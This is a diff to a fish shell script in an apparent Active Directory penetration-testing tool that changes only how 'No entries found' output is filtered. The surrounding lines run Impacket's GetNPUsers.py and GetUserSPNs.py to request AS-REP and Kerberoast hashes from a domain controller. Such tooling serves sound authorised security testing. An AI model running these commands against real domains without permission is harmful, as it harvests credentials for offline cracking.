@@ -484,13 +484,13 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
     if test "$cross_domain" = true; or set -q _flag_kerb
         if test -f $users_file
             ezpz_cmd "GetNPUsers.py $target_domain/ -dc-ip $dc_ip -usersfile $users_file -no-pass -request -outputfile $asrep_file"
-            ezpz_spin GetNPUsers.py $target_domain/ -dc-ip $dc_ip -usersfile $users_file -no-pass -request -outputfile $asrep_file | grep -aiE "(No entries found|Error)"
+            ezpz_spin GetNPUsers.py $target_domain/ -dc-ip $dc_ip -usersfile $users_file -no-pass -request -outputfile $asrep_file | grep -aiE 'Error'
         else
             ezpz_warn "Users file $users_file not found. Skipping cross-domain AS-REP roasting with usersfile."
         end
     else
         ezpz_cmd "GetNPUsers.py $imp_auth -request -outputfile $asrep_file"
-        ezpz_spin GetNPUsers.py $imp_auth -request -outputfile $asrep_file | grep -aiE "(No entries found|Error)"
+        ezpz_spin GetNPUsers.py $imp_auth -request -outputfile $asrep_file | grep -aiE 'Error'
     end
 
     if test -s $asrep_file
@@ -505,10 +505,10 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
     set kerb_file "$file_domain"_kerb.hash
     if test "$cross_domain" = true
         ezpz_cmd "GetUserSPNs.py $imp_auth -target-domain $target_domain -request -outputfile $kerb_file"
-        ezpz_spin GetUserSPNs.py $imp_auth -target-domain $target_domain -request -outputfile $kerb_file | grep -aiE "(No entries found|Error)"
+        ezpz_spin GetUserSPNs.py $imp_auth -target-domain $target_domain -request -outputfile $kerb_file | grep -aiE 'Error'
     else
         ezpz_cmd "GetUserSPNs.py $imp_auth -request -outputfile $kerb_file"
-        ezpz_spin GetUserSPNs.py $imp_auth -request -outputfile $kerb_file | grep -aiE "(No entries found|Error)"
+        ezpz_spin GetUserSPNs.py $imp_auth -request -outputfile $kerb_file | grep -aiE 'Error'
     end
     if test -s $kerb_file
         # Convert hashes to user:hash format and save to a temporary file
@@ -693,14 +693,14 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
     end
     set output (cat $delegation_tmp)
     rm -f $delegation_tmp
-    set error_lines (printf '%s\n' $output | grep -aiE "(No entries found|Error)")
+    set error_lines (printf '%s\n' $output | grep -aiE 'Error')
     set -l delegation_out
     if test -n "$error_lines"
         for line in $error_lines
             set -a delegation_out (string replace -r '^\[-\] ' '' -- $line)
         end
     else
-        set delegation_out (printf '%s\n' $output | grep -a --color=never "\\S" | tail -n +2)
+        set delegation_out (printf '%s\n' $output | grep -av 'No entries found' | grep -a --color=never "\\S" | tail -n +2)
     end
     if test -n "$delegation_out"
         printf '%s\n' $delegation_out
